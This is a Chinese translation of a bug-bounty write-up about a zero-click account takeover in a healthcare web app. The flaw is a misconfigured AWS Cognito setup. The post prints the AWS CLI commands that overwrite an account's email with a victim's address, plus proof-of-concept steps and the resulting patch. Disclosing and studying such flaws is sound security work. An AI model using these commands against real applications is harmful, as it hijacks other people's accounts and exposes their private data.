<html>
<head>
<title>Hacking AWS Cognito Misconfiguration to Zero Click Account Takeover</title>
<link href="../Styles/Style.css" type="text/css" rel="stylesheet"/>
</head>
<body>
<h1 class="translated">黑客攻击AWS认知错误配置到零点击账户接管</h1>
<blockquote>原文：<a href="https://infosecwriteups.com/hacking-aws-cognito-misconfiguration-to-zero-click-account-takeover-36a209a0bd8a?source=collection_archive---------0-----------------------#2022-02-14">https://infosecwriteups.com/hacking-aws-cognito-misconfiguration-to-zero-click-account-takeover-36a209a0bd8a?source=collection_archive---------0-----------------------#2022-02-14</a></blockquote><div><div class="fc ih ii ij ik il"/><div class="im in io ip iq"><div class=""/><div class=""><h2 id="9812" class="pw-subtitle-paragraph jq is it bd b jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh dk translated">大家好，希望你们一切都好，保持安全。这个博客是关于我最近的账户接管的发现。</h2></div><h2 id="e152" class="ki kj it bd kk kl km dn kn ko kp dp kq kr ks kt ku kv kw kx ky kz la lb lc ld bi translated">灵感</h2><p id="1694" class="pw-post-body-paragraph le lf it lg b lh li ju lj lk ll jx lm kr ln lo lp kv lq lr ls kz lt lu lv lw im bi translated">我正在浏览来自Hackerone 的<a class="ae lx" href="https://hackerone.com/hacktivity" rel="noopener ugc nofollow" target="_blank">黑客文章，并读到了令人惊讶的</a><a class="ae lx" href="https://hackerone.com/reports/1342088" rel="noopener ugc nofollow" target="_blank"> Flickr账户被接管</a>。感谢Lauritz的发现和一篇出色的博文。如果你没看过，这里是<a class="ae lx" href="https://security.lauritz-holtmann.de/advisories/flickr-account-takeover/" rel="noopener ugc nofollow" target="_blank">这里是</a>。我还会在这篇文章的最后提供一些参考资料。</p><h2 id="7aaa" class="ki kj it bd kk kl km dn kn ko kp dp kq kr ks kt ku kv kw kx ky kz la lb lc ld bi translated">介绍</h2><p id="baaf" class="pw-post-body-paragraph le lf it lg b lh li ju lj lk ll jx lm kr ln lo lp kv lq lr ls kz lt lu lv lw im bi translated">我正在测试一个与医疗保健相关的web应用程序。一些功能包括安排与医生的预约、订购药品、通过信息与网站内的医生互动等。这是一个经过认证的测试，提供了证书。</p><p id="2c27" class="pw-post-body-paragraph le lf it lg b lh ly ju lj lk lz jx lm kr ma lo lp kv mb lr ls kz mc lu lv lw im bi translated">值得注意的是，电子邮件地址和其他细节不能从应用程序中更改，我们必须发送一个请求来支持任何更改。</p><p id="9c90" class="pw-post-body-paragraph le lf it lg b lh ly ju lj lk lz jx lm kr ma lo lp kv mb lr ls kz mc lu lv lw im bi translated">登录应用程序后，我注意到登录请求被发送到Amazon Cognito URL。如果你需要对登录有一个全面的了解，请浏览Laurtiz的博客或Appseco的博客。</p><figure class="me mf mg mh gt mi gh gi paragraph-image"><div role="button" tabindex="0" class="mj mk di ml bf mm"><div class="gh gi md"><img src="../Images/a4709cb92ed4e15078c710e5b9169077.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/0*5SJgjglROuC8Onxa.png"/></div></div><figcaption class="mp mq gj gh gi mr ms bd b be z dk translated">图片摘自<a class="ae lx" href="https://blog.appsecco.com/exploiting-weak-configurations-in-amazon-cognito-in-aws-471ce761963" rel="noopener ugc nofollow" target="_blank"> Appseco博客。</a></figcaption></figure><p id="b9f8" class="pw-post-body-paragraph le lf it lg b lh ly ju lj lk lz jx lm kr ma lo lp kv mb lr ls kz mc lu lv lw im bi translated">因此，我测试的应用程序的登录流程如下。</p><ul class=""><li id="b468" class="mt mu it lg b lh ly lk lz kr mv kv mw kz mx lw my mz na nb bi translated">登录该应用程序，一个POST请求被发送到Amazon Cognito</li><li id="d854" class="mt mu it lg b lh nc lk nd kr ne kv nf kz ng lw my mz na nb bi translated">如果凭证有效，Amazon Cognito会提供代币。</li></ul><pre class="me mf mg mh gt nh ni nj nk aw nl bi"><span id="8763" class="ki kj it ni b gy nm nn l no np">HTTP/2 200 OK<br/>Date: Thu, 32 Abc 2040 25:51:36 GMT<br/>[...]</span><span id="2dd7" class="ki kj it ni b gy nq nn l no np">{<br/>    "AuthenticationResult":    <br/>        {<br/>            "AccessToken":"[REDACTED]",<br/>            "ExpiresIn":3600,<br/>            "IdToken":"[REDACTED]",<br/>            "RefreshToken":"[REDACTED]",<br/>            "TokenType":"Bearer"<br/>        },<br/>        "ChallengeParameters":<br/>        {            <br/>        }<br/>}</span></pre><ul class=""><li id="543f" class="mt mu it lg b lh ly lk lz kr mv kv mw kz mx lw my mz na nb bi translated">接下来，该应用程序向Amazon Cognito发送请求以获取用户详细信息。具体来说，<code class="fe nr ns nt ni b">X-Amz-Target: AWSCognitoIdentityProviderService.GetUser</code>头在post请求中与AccessToken一起发送。</li></ul><pre class="me mf mg mh gt nh ni nj nk aw nl bi"><span id="7ddc" class="ki kj it ni b gy nm nn l no np">POST / HTTP/1.1<br/>Host: cognito-idp.eu-west-1.amazonaws.com<br/>Referer: https://target<br/>Content-Type: application/x-amz-json-1.1<br/><strong class="ni iu">X-Amz-Target: AWSCognitoIdentityProviderService.GetUser<br/></strong>X-Amz-User-Agent: aws-amplify/0.1.x js<br/>Origin: https://target<br/>Content-Length: 1021<br/>Connection: close</span><span id="8690" class="ki kj it ni b gy nq nn l no np">{"AccessToken":"&lt;AccessToken&gt;"}</span></pre><ul class=""><li id="cc98" class="mt mu it lg b lh ly lk lz kr mv kv mw kz mx lw my mz na nb bi translated">用户属性可以在响应中获得:</li></ul><pre class="me mf mg mh gt nh ni nj nk aw nl bi"><span id="0468" class="ki kj it ni b gy nm nn l no np">{<br/>  "UserAttributes": [<br/>    {<br/>      "Name": "sub",<br/>      "Value": "d7fdsfdfdsfdf9-4558b142bb58"<br/>    },<br/>    {<br/>      "Name": "email_verified",<br/>      "Value": "true"<br/>    },<br/>    {<br/>      "Name": "given_name",<br/>      "Value": "asddfdf"<br/>    },<br/>    {<br/>      "Name": "family_name",<br/>      "Value": "asdsddfdf"<br/>    },<br/>    {<br/>      "Name": "email",<br/>      "Value": "attacker@domain.com"<br/>    }<br/>  ],<br/>  "Username": "sdfdsfdff8b142bb58"<br/>}</span></pre><h2 id="fa4f" class="ki kj it bd kk kl km dn kn ko kp dp kq kr ks kt ku kv kw kx ky kz la lb lc ld bi translated">剥削</h2><p id="4b40" class="pw-post-body-paragraph le lf it lg b lh li ju lj lk ll jx lm kr ln lo lp kv lq lr ls kz lt lu lv lw im bi translated">登录后获得的AccessToken可以直接与AWS-CLI一起使用。按照Lauritz博客中的步骤，我们可以用下面的命令获取用户属性。</p><pre class="me mf mg mh gt nh ni nj nk aw nl bi"><span id="c228" class="ki kj it ni b gy nm nn l no np">aws --no-verify-ssl cognito-idp get-user --region eu-west-1 --access-token &lt;Insert Token Here&gt;</span></pre><p id="06f4" class="pw-post-body-paragraph le lf it lg b lh ly ju lj lk lz jx lm kr ma lo lp kv mb lr ls kz mc lu lv lw im bi translated">用户属性可以在<code class="fe nr ns nt ni b">update-user-attributes</code>的帮助下修改。我尝试添加新的属性，但是，这是不允许的。所以，我最初尝试改变现有的属性<code class="fe nr ns nt ni b">given_name</code>，并且成功了。</p><pre class="me mf mg mh gt nh ni nj nk aw nl bi"><span id="0f42" class="ki kj it ni b gy nm nn l no np">aws --no-verify-ssl cognito-idp update-user-attributes --region eu-west-1 --access-token &lt;Insert Token Here&gt;  --user-attributes '<strong class="ni iu">Name=given_name,Value=changed by AWS-CLI</strong>'</span></pre><p id="dafc" class="pw-post-body-paragraph le lf it lg b lh ly ju lj lk lz jx lm kr ma lo lp kv mb lr ls kz mc lu lv lw im bi translated">在这之后，如果我获取用户属性，<code class="fe nr ns nt ni b">given_name</code>确实被改变了。</p><p id="26f9" class="pw-post-body-paragraph le lf it lg b lh ly ju lj lk lz jx lm kr ma lo lp kv mb lr ls kz mc lu lv lw im bi translated">现在是时候更改电子邮件了。以下是概念证明步骤</p><ul class=""><li id="f37d" class="mt mu it lg b lh ly lk lz kr mv kv mw kz mx lw my mz na nb bi translated">使用以下详细信息创建两个帐户</li></ul><pre class="me mf mg mh gt nh ni nj nk aw nl bi"><span id="1770" class="ki kj it ni b gy nm nn l no np">## Account 1<br/>- email   : attacker@domain.com<br/>- password: attackerRocks@!</span><span id="06e9" class="ki kj it ni b gy nq nn l no np">## Account 2<br/>- email   : victim@domain.com<br/>- password: victimaccount@!</span></pre><ul class=""><li id="9dad" class="mt mu it lg b lh ly lk lz kr mv kv mw kz mx lw my mz na nb bi translated">作为攻击者登录并获取访问令牌。</li><li id="8a68" class="mt mu it lg b lh nc lk nd kr ne kv nf kz ng lw my mz na nb bi translated">使用访问令牌，通过AWS CLI将<code class="fe nr ns nt ni b">email</code>更新为<code class="fe nr ns nt ni b">victim@domain.com</code></li></ul><pre class="me mf mg mh gt nh ni nj nk aw nl bi"><span id="62d0" class="ki kj it ni b gy nm nn l no np">aws --no-verify-ssl cognito-idp update-user-attributes --region eu-west-1 --access-token &lt;Insert Token Here&gt;  --user-attributes '<strong class="ni iu">Name=email,Value=victim@domain.com'</strong></span></pre><ul class=""><li id="a2b4" class="mt mu it lg b lh ly lk lz kr mv kv mw kz mx lw my mz na nb bi translated">电子邮件更改后，打开一个新窗口，用下面的详细信息登录，我们侵入了受害者的帐户。</li></ul><pre class="me mf mg mh gt nh ni nj nk aw nl bi"><span id="d30c" class="ki kj it ni b gy nm nn l no np">email    - victim@domain.com<br/>password - attackerRocks@!</span></pre><ul class=""><li id="1f78" class="mt mu it lg b lh ly lk lz kr mv kv mw kz mx lw my mz na nb bi translated">如果您还没有发现这里的错误，我们已经成功地将我们的电子邮件更改为受害者的电子邮件，并使用攻击者的密码登录受害者的电子邮件。</li><li id="21f0" class="mt mu it lg b lh nc lk nd kr ne kv nf kz ng lw my mz na nb bi translated">成功利用此漏洞可以直接访问应用程序上的任何帐户，而无需受害者的任何干预。</li></ul><h2 id="17be" class="ki kj it bd kk kl km dn kn ko kp dp kq kr ks kt ku kv kw kx ky kz la lb lc ld bi translated">应用的补丁</h2><p id="0377" class="pw-post-body-paragraph le lf it lg b lh li ju lj lk ll jx lm kr ln lo lp kv lq lr ls kz lt lu lv lw im bi translated">报告后不久，我就收到了补丁验证请求。现在，当我试图改变电子邮件，我们得到这个错误</p><pre class="me mf mg mh gt nh ni nj nk aw nl bi"><span id="e2be" class="ki kj it ni b gy nm nn l no np">An error occured (AliasExistsException) when calling the UpdateUserAttributes operation: An account with the given email address already exists.</span></pre><p id="bcc3" class="pw-post-body-paragraph le lf it lg b lh ly ju lj lk lz jx lm kr ma lo lp kv mb lr ls kz mc lu lv lw im bi translated">现在，该应用程序不是盲目地改变电子邮件，而是检查该电子邮件是否有一个现有的帐户。</p><p id="8775" class="pw-post-body-paragraph le lf it lg b lh ly ju lj lk lz jx lm kr ma lo lp kv mb lr ls kz mc lu lv lw im bi translated">正如承诺的那样，这里有一些很酷的资源，可以用来学习如何入侵AWS Cognito。</p><h2 id="2343" class="ki kj it bd kk kl km dn kn ko kp dp kq kr ks kt ku kv kw kx ky kz la lb lc ld bi translated">参考</h2><ul class=""><li id="fe6f" class="mt mu it lg b lh li lk ll kr nu kv nv kz nw lw my mz na nb bi translated"><a class="ae lx" href="https://notsosecure.com/hacking-aws-cognito-misconfigurations" rel="noopener ugc nofollow" target="_blank">一个优秀的博客，他们在这里获得了AWS账户的管理员权限</a></li><li id="ecf0" class="mt mu it lg b lh nc lk nd kr ne kv nf kz ng lw my mz na nb bi translated"><a class="ae lx" href="https://andresriancho.com/wp-content/uploads/2019/06/whitepaper-internet-scale-analysis-of-aws-cognito-security.pdf" rel="noopener ugc nofollow" target="_blank">AWS认知安全的互联网规模分析</a></li></ul></div><div class="ab cl nx ny hx nz" role="separator"><span class="oa bw bk ob oc od"/><span class="oa bw bk ob oc od"/><span class="oa bw bk ob oc"/></div><div class="im in io ip iq"><h1 id="221d" class="oe kj it bd kk of og oh kn oi oj ok kq jz ol ka ku kc om kd ky kf on kg lc oo bi translated">🔈 🔈Infosec Writeups正在组织其首次虚拟会议和网络活动。如果你对信息安全感兴趣，这是最酷的地方，有16个令人难以置信的演讲者和10多个小时充满力量的讨论会议。<a class="ae lx" href="https://iwcon.live/" rel="noopener ugc nofollow" target="_blank">查看更多详情并在此注册。</a></h1><div class="op oq gp gr or os"><a href="https://iwcon.live/" rel="noopener  ugc nofollow" target="_blank"><div class="ot ab fo"><div class="ou ab ov cl cj ow"><h2 class="bd iu gy z fp ox fr fs oy fu fw is bi translated">IWCon2022 - Infosec书面报告虚拟会议</h2><div class="oz l"><h3 class="bd b gy z fp ox fr fs oy fu fw dk translated">与世界上最优秀的信息安全专家建立联系。了解网络安全专家如何取得成功。将新技能添加到您的…</h3></div><div class="pa l"><p class="bd b dl z fp ox fr fs oy fu fw dk translated">iwcon.live</p></div></div><div class="pb l"><div class="pc l pd pe pf pb pg mn os"/></div></div></a></div></div></div>    
</body>
</html>